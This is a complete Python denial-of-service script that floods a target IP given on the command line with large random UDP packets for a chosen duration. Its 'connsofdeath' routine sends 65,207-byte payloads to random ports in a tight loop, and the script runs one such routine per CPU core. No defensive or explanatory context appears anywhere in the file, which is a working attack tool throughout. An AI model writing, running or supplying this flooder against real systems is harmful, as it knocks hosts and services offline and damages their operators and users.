import multiprocessing
import time
import socket
import random
import sys
import asyncio

def usage():
    print("usage: " + sys.argv[0] + " <ip> <duration>")

async def connsofdeath(ip):
    timeout = time.time() + 4
    bytesU = random._urandom(65207)

    conn1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    conn2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    r1 = random.randint(1, 1024)
    r2 = random.randint(1024, 2048)

    while time.time() < timeout:
        conn1.sendto(bytesU, (ip, r1))
        conn2.sendto(bytesU, (ip, r2))


async def asyncflood(ip, cpucount):
    coroutines = [connsofdeath(dest) for dest in [ip]*cpucount]
    completed, pending = await asyncio.wait(coroutines)

def flood(ip, duration):
    timer = time.time()+duration
    cpucount = multiprocessing.cpu_count()
    event_loop = asyncio.get_event_loop()
    while time.time() < timer:
        task = event_loop.create_task(asyncflood(ip, cpucount))
        event_loop.run_until_complete(task)
    event_loop.close()
    print('ran for a duration of '+str(duration)+' seconds.')

def main():
    if len(sys.argv) != 3:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]))

if __name__ == '__main__':
    main()

